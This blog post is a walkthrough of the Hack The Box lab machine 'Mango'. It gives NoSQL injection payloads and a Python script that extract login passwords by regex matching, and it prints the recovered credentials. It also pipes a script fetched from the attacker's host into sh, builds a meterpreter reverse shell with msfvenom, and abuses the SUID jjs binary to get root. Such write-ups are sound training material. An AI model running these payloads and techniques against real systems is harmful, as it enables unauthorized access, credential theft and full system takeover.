---
layout: single
title: Mango - Hack The Box
excerpt: "Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root."
date: 2020-04-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-mango/mango_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - mango
  - nosql
  - jjs
---

![](/assets/images/htb-writeup-mango/mango_logo.png)

Mango was a medium box with a NoSQSL injection in the login page that allows us to retrieve the username and password. The credentials we retrieve through the injection can be used to SSH to the box. For privilege escalation, the jjs tool has the SUID bit set so we can run scripts as root.

## Summary

- There's an authentication page using MangoDB that is vulnerable to NoSQL injection
- We can extract the username and passwords for two accounts: `mango` and `admin`
- Using the recovered password, we can SSH as `mango` then su to `admin`
- The jjs java utility is installed and is SUID root so we can execute anything as root

## Portscan

```
root@kali:~/htb# nmap -T4 -p- 10.10.10.162
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-27 21:47 EDT
Nmap scan report for mango.htb (10.10.10.162)
Host is up (0.040s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

## Recon - HTTP

Using the IP address I get a Forbidden error message when I try to access the site on port 80.

![](/assets/images/htb-writeup-mango/web1.png)

I tried using `mango.htb` but I get the same error message.

Nothing shows up when fuzzing files and directories:

```
root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -u http://mango.htb --no-banner -S 400,401,403,404
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2019-10-27 20:47:41

  [00:02:45] ########################################   40908/40908   ETA: 00:00:00 req/s: 24
```

## Recon - HTTPS

The page on port 443 is different: It looks like a Google page but anytime I try to search for something I get `Search Results: 0 results found`

![](/assets/images/htb-writeup-mango/web2.png)

There's an analytics page that shows some kind of javascript application and there's an error message about an invalid license.

![](/assets/images/htb-writeup-mango/web3.png)

As far as I can see this is a local application and nothing I do gets sent to the server. It's probably safe to skip that one for now.

Nothing else shows up when fuzzing files and directories:

```
root@kali:~/htb# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php -k -u https://mango.htb --no-banner -S 400,401,403,404
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2019-10-27 20:47:52

GET     200 OK                          https://mango.htb/analytics.php
GET     200 OK                          https://mango.htb/index.php
  [00:02:42] ########################################   40908/40908   ETA: 00:00:00 req/s: 252
```

## Fuzzing vhosts to find the staging site

I found the `staging-order.mango.htb` site by fuzzing the vhosts.

```
root@kali:~# ffuf -w ~/tools/SecLists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.mango.htb" -fc 400,403 -u http://10.10.10.162

[...]

staging-order           [Status: 200, Size: 4022, Words: 447, Lines: 210]
```

There's a login page with a non-functional Forgot Password button.

![](/assets/images/htb-writeup-mango/web4.png)

## NoSQL injection on the login page

I ran SQLmap and looked for SQL injections on the login page but couldn't find any. I also tried a bunch of simple user/passwords combos in case it's something really simple. Before going to bruteforce I thought I'd try some MangoDB injection since the name of the box looks like a hint.

I'll use the NoSQL injection page from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection) as a reference to try a few payloads.

With `username[$ne]=bob&password[$ne]=invalid&login=login` I can set a negative comparison on the username and password and I notice that I get a 302 HTTP return code instead of a 200 like when I try invalid credentials. I've successfully bypassed the authentication page but the `home.php` I get redirected to doesn't have anything on it.

![](/assets/images/htb-writeup-mango/web5.png)

I'll go back to the NoSQL injection and try to extract the usernames and passwords from the database. First, I'll find the username by using the `[$regex]` operator so I can provide a regex inside of the username parameter.

I already guessed that `admin` is a valid username so I don't even need the regex for that one. The following evaluates to TRUE (returns a 302):

`username[$regex]=^admin$&password[$ne]=invalid&login=login`

Next, I'll try each letter of the alphabet like this:

`username[$regex]=^b.*$&password[$ne]=invalid&login=login`

I find a username starting with letter m with:

`username[$regex]=^m.*$&password[$ne]=invalid&login=login`

So now I just need to guess each letter like:

`username[$regex]=^m.*$&password[$ne]=invalid&login=login`

`username[$regex]=^ma.*$&password[$ne]=invalid&login=login`

`username[$regex]=^man.*$&password[$ne]=invalid&login=login`

`username[$regex]=^mang.*$&password[$ne]=invalid&login=login`

`username[$regex]=^mango.*$&password[$ne]=invalid&login=login`

So I have `mango` and `admin` as valid usernames. Now it's time to tackle the passwords for each account. I can find the password length by using something like this:

Admin (12 characters): `username=admin&password[$regex]=^.{12}$&login=login`
Mango (16 characters): `username=mango&password[$regex]=^.{16}$&login=login`

For the password, I can just the same technique manually or write a simple script like the following to automate the process:

```python
#!/usr/bin/env python3

import re
import requests
import string

chars = string.ascii_letters + string.digits + string.punctuation

print(f"Charset {chars}")

url = "http://staging-order.mango.htb/"
p = ""

while True:
    print(p)
    for x in chars:
        data = {
            "username": "admin",
            "password[$regex]": f"^{re.escape(p+x)}.*$",
            "login": "login"
        }
        r = requests.post(url, data=data, proxies={"http":"127.0.0.1:8080"}, allow_redirects=False)
        if r.status_code == 302:
            p += x
            break
```

```
root@kali:~/htb/mango# ./mango.py 
Charset abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~

t
t9
t9K
t9Kc
t9KcS
t9KcS3
t9KcS3>
t9KcS3>!
t9KcS3>!0
t9KcS3>!0B
t9KcS3>!0B#
t9KcS3>!0B#2
t9KcS3>!0B#2
```

I just replace `admin` by `mango` and run it again. I got the following passwords now:

admin: `t9KcS3>!0B#2`
mango: `h3mXK8RhU~f{]f5H`

## Getting a shell as user admin

I can SSH to the machine and su to `admin` since I also have the password for that user:

![](/assets/images/htb-writeup-mango/shell1.png)

## Privesc using jjs

With [LinEnum.sh](https://github.com/rebootuser/LinEnum) I see there's a SUID file for `jjs`:

```
admin@mango:/home/admin$ curl 10.10.14.11/LinEnum.sh | sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 46108  100 46108    0     0   229k      0 --:--:-- --:--:-- --:--:--  228k
-e 
#########################################################
-e # Local Linux Enumeration & Privilege Escalation Script #
-e #########################################################
-e # www.rebootuser.com
-e # version 0.98
[...]
-e [+] Possibly interesting SUID files:
-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
-e 
```

A quick search on [GTFObins](https://gtfobins.github.io/gtfobins/jjs/) shows that we can execute commands with `jjs`.

I can quickly get the root flag with:

![](/assets/images/htb-writeup-mango/root1.png)

Or get a proper shell by generating a meterpreter shell with the `PrependSetuid` option:

```
root@kali:~/htb/mango# msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o met LHOST=10.10.14.11 LPORT=4444 PrependSetuid=true
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 146 bytes
Final size of elf file: 266 bytes
Saved as: met
```

![](/assets/images/htb-writeup-mango/root2.png)

![](/assets/images/htb-writeup-mango/root3.png)

Or, a faster way to get a root shell is to make bash SUID:

```
admin@mango:/home/admin$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> Java.type('java.lang.Runtime').getRuntime().exec('chmod u+s /bin/bash').waitFor()
0
jjs> 
admin@mango:/home/admin$ /bin/bash -p
bash-4.4# id
uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
```